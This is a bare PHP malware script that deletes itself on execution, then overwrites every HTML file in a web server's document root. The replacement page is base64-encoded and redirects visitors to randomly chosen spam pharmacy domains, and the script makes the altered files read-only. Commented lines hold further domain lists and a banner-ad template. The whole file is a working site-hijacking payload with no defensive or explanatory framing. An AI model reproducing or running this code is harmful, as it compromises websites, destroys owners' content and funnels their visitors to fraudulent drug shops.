<?php unlink(__FILE__); 

$x_domains = explode(',' ,  "newnaturalsale.su,yourgenericeshop.su,mypillssale.su");
//$x_gif = explode(',' ,  "1,2,3,4,7,9");
//$ggg = base64_decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgICA8dGl0bGU+RVhUUkEgT0ZGRVI8L3RpdGxlPg0KICAgIDxzdHlsZT4NCiAgICAgICAgLndyYXBwZXIgew0KICBwb3NpdGlvbjogYWJzb2x1dGU7DQogIHRvcDogMjAlOw0KICByaWdodDogMDsNCiAgYm90dG9tOiAwOw0KICBsZWZ0OiAwOw0KICBtYXJnaW46IGF1dG87DQp9DQouYm94IHsNCiANCiAgcG9zaXRpb246IGFic29sdXRlOw0KICB0b3A6IDEwJTsNCiAgcmlnaHQ6IDA7DQogIGJvdHRvbTogMDsNCiAgbGVmdDogMDsNCiAgbWFyZ2luOiBhdXRvOw0KIA0KfQ0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxhIGhyZWY9Imh0dHA6Ly8jI0xJTktfVVJMIyMvIj4NCiAgICA8ZGl2IGFsaWduPSJjZW50ZXIiIGNsYXNzPSJ3cmFwcGVyIj4NCg0KPGltZyBzcmM9Imh0dHA6Ly8jI0xJTktfVVJMIyMvaW1nL3Byb21vL2ltZzMwMC0yNTAtIyNJRCMjLmdpZiIgd2lkdGg9IjYwMCIgaGVpZ2h0PSI1MDAiPg0KDQo8ZGl2IGNsYXNzPSJib3giPjwvZGl2Pg0KDQo8L2Rpdj4NCjwvYT4NCjwvYm9keT4NCjwvaHRtbD4=");
//$ggg = str_replace( '##ID##',   $x_gif[array_rand($x_gif)], $ggg );
//$ggg = base64_encode(str_replace( '##LINK_URL##',   $x_domains[array_rand($x_domains)]   , $ggg ));


//$x_domains = explode(',' ,  "curingpharminc.su,curingremedydeal.su,familyprivateinc.ru,familyrxoutlet.su,fastsafestore.su,firstpilltrade.ru,goodcarequality.su,goodmedsservice.su,healtylifepoint.com,homefastelement.su,homefastmall.su,hotaidservice.su,hotmedicaltrade.su,jenmichaela.ru,magicpillgroup.ru,marenezmeralda.ru,medicalmedsinc.su,meghannleisha.ru,myfastassist.com,mypillssale.su,mysafeinvestment.su,newcaregroup.su,newglobaleshop.su,newmedicalstore.com,newnaturalsale.su,onlinerxelement.su,purefamilymall.su,roxanacoraline.ru,safepharmvalue.su,securebestmall.su,securedrugsinc.su,smarttabletshop.su,theherbalwebmart.su,thomasinerochalena.ru,trustedcareinc.ru,vinniedulcia.ru,yourgenericeshop.su,yourgenericsmart.su,yourhealthmarket.su,yourherbalgroup.su");
$ggg = base64_decode("PCFET0NUWVBFIEhUTUw+DQo8aHRtbCBsYW5nPSJlbi1VUyI+DQogICAgPGhlYWQ+DQogICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICAgICA8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwOyB1cmw9IyNMSU5LX1VSTCMjIj4NCiAgICAgICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAiIyNMSU5LX1VSTCMjIg0KICAgICAgICA8L3NjcmlwdD4NCiAgICAgICAgPHRpdGxlPlBhZ2UgUmVkaXJlY3Rpb248L3RpdGxlPg0KICAgIDwvaGVhZD4NCiAgICA8Ym9keT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8IS0tIE5vdGU6IGRvbid0IHRlbGwgcGVvcGxlIHRvIGBjbGlja2AgdGhlIGxpbmssIGp1c3QgdGVsbCB0aGVtIHRoYXQgaXQgaXMgYSBsaW5rLiAtLT4NCiAgICAgICAgSWYgeW91IGFyZSBub3QgcmVkaXJlY3RlZCBhdXRvbWF0aWNhbGx5LCBmb2xsb3cgdGhpcyA8YSBocmVmPScjI0xJTktfVVJMIyMnPmxpbmsgdG8gZXhhbXBsZTwvYT4uDQogICAgPC9ib2R5Pg0KPC9odG1sPg0K");
$ggg = base64_encode(str_replace( '##LINK_URL##',  'http://' .  $x_domains[array_rand($x_domains)]  . '/' , $ggg ));

//echo base64_decode($ggg);




$root =  $_SERVER["DOCUMENT_ROOT"];
if (strpos($root,'/') !== false) {
    $path =  $root . "/";
}
else $path = $root . "\\";

//echo $path . PHP_EOL;

$root = $path;




$shell_url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] ;

foreach(glob($root . '/*.html') as $fname) {
//   echo $fname . PHP_EOL;


$files_changed++;
//echo  'INDEX.PHP PATCHED--1111111' . PHP_EOL;

$filepath=$fname;
$basename = preg_replace('/^.+[\\\\\\/]/', '', $filepath);
//echo $basename;


chmod($fname, 0644);


file_put_contents($fname, base64_decode($ggg));
$fp = fopen($fname , 'w');
fwrite($fp, base64_decode($ggg));
fclose($fp);
chmod($fname, 0444);



//echo file_get_contents($fname);

//echo $shell_url . '/' . $basename . PHP_EOL ;
//break;


}



//echo 'Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files'; 
echo 'Domain = ' .  $server_domain .  '  Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files'; 







